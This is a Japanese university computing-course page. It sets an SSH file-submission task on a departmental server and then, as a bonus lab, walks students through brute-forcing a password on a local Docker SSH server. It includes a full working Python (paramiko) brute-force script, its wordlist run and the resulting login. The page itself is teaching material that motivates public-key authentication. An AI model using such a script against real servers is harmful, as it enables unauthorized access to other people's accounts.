# 課題

!!! Warning
    課題１と２は、Codespaceで行ってはいけません。情報漏洩のリスクがあります。  
    間違えてやってしまった場合は、早急にTAに連絡してください。

## 課題１（当日のみUTokyo-VPN不要）
559のサーバーであるdover.eps.s.u-tokyo.ac.jpにSSHでログインしてください。  
次に、課題１で手元に持ってきたkadai.txtに対する答えを、doverの/home0/akutagawa2024/submitディレクトリに送ってください。  
ファイルの名前は、(アカウント名).txtでお願いします。  
※3日後にはUTokyo-VPN経由でのみアクセス可能な設定に戻します。


## おまけ：パスワード認証SSHサーバーに対するサイバー攻撃
公開鍵認証の大切さを知るために、サイバー攻撃の流れを見てみましょう。

実際に取り組めるようにしているので、余裕のある方はハッカー(正確にはクラッカー)になったつもりでやってみてください。Codespaceで行うのが楽かなと思います。  
かなり都合の良い展開が続きますが、それは上手くいくようにわざとセットしたからです。

!!! Warning
    許可無く他のサーバーに以下のことを行った場合、ほぼ間違いなく法に触れることになります。  
    決して行ってはいけません。  

---

ログインサーバー(559で言うところのdover)へ遠隔ログインを試みます。  
この際、あなたはOSINT等によりユーザー名「chibutsu」は推測できたものの、パスワードは分からないことが前提です。つまり不正ログインをしようとしているわけです。  
どのようにパスワードを入手しますか？　自分の長所を活かした方法を考えてみてください。

---

今回は計算機演習の授業なので、コンピュータ内で完結する手法の1つを紹介します。  
心理学的な攻撃を思いついた方は、「ソーシャルエンジニアリング」で検索してみてください。

---

今回は軽量コンテナであるdockerを用いて仮想的なログインサーバーを作り、それを攻撃します。   
自分のPCにdockerをインストールするか、Codespaceを使ってください。559のMac miniにはインストールされていません。

---

以下、Codespaceで行う場合の手順です。  
まずは、`/workspaces/chibutsu-utokyo.github.io/docs/RemoteAccess`に移動して、docker_setup.shを実行してください。少し時間がかかります。
```
$ cd /workspaces/chibutsu-utokyo.github.io/docs/RemoteAccess

# 権限を要求された場合
$ chmod 700 docker_setup.sh
$ ./docker_setup.sh
```
上手くいけば、以下のようなメッセージが表示されるはずです。
```
dockerコンテナの準備が完了しました。
'ssh ユーザー名@localhost -p 22222'でSSHログインができます。
```

試しにSSHしてみましょう。パスワードは今のところ分からないはずなので、適当に入力してください。
```
$ ssh chibutsu@localhost -p 22222
The authenticity of host '[localhost]:22222 ([::1]:22222)' can't be established.
ECDSA key fingerprint is SHA256:7CsZMUdMUJCx9qX89ZxRaUj2s8u8MBnuB2NUFZK+W4A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:22222' (ECDSA) to the list of known hosts.
chibutsu@localhost's password: 
Permission denied, please try again.
chibutsu@localhost's password: 
Permission denied, please try again.
chibutsu@localhost's password: 
chibutsu@localhost: Permission denied (publickey,password).
```
当たり前ですがログインできません…

---

今回はブルートフォース攻撃(総当たり攻撃)をやってみようと思います。あり得そうなパスワードのリストを片っ端から試す攻撃手法です。  

調査の結果、「chibutsu」さんは東京大学の地球惑星物理学科に所属する学生であることが分かりました。
主に固体地球・大気海洋・宇宙惑星が好きな学生が所属する機関らしいです。  
この情報を元にChatGPTにパスワードリストを作成してもらい、passwords.txtに保存しました。  

それでは、このパスワードリストを用いてSSHログインを試しましょう。  
シェルスクリプトで攻撃コードを組むのは意外と大変なので、Pythonで組みました。  
理解できなくても良いので、bruteforce_ssh.pyを眺めてみてください。Pythonの授業が終わる頃には、何をしているかなんとなく分かるようになっているはずです。 

```
# bruteforce_ssh.py

import paramiko 
import time
import sys


passwords_path = "passwords.txt" # パスワードリストの場所

# ssh ユーザー名@localhost -p 22222
HOST = "localhost" # SSH接続先
PORT = 22222 # SSH接続のためのポート番号。今回は22222。
USER = "chibutsu" # ユーザー名

# パスワードリストからパスワードを読み込んでSSH接続を試みる。
# 接続が成功したらプログラムを終了させる。
# 失敗したら次のパスワードを試す。
with open(passwords_path, "r") as file:

    for PASSWORD in file:

        # 改行コードを取り除く
        PASSWORD = PASSWORD.replace("\n", "")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(hostname=HOST, port=PORT, username=USER, password=PASSWORD)
            print()
            print("SUCCESS!")
            print(f"username : {USER}")
            print(f"password : {PASSWORD}")

            sys.exit()
        except paramiko.AuthenticationException:
            print(f"{PASSWORD} is not correct...")
        finally:
            ssh.close()
```

!!! Note
    paramikoというライブラリが必要です。`pip install paramiko`でインストールしてください。

このコードを試した結果、パスワードが判明しました。
```
$ python bruteforce_ssh.py 
earth is not correct...
planet is not correct...
physics is not correct...
...
tornado is not correct...
storm is not correct...

SUCCESS!
username : chibutsu
password : aurora
```

SSHログインします。
```
$ ssh chibutsu@localhost -p 22222
chibutsu@localhost's password:  # "aurora"と入力
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.5.0-1017-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
chibutsu@960522125acf:~$ 
```

これで不正ログイン完了です。 

ここからは権限昇格を狙ったりバックドアを仕込んだりしますが、これ以上は行いません。  
ここまでお付き合いいただきありがとうございました。  

---

公開鍵認証が大切だと少しでも感じていただけた方は設定をお願いします。  
[SSHのページ](SSH.md)

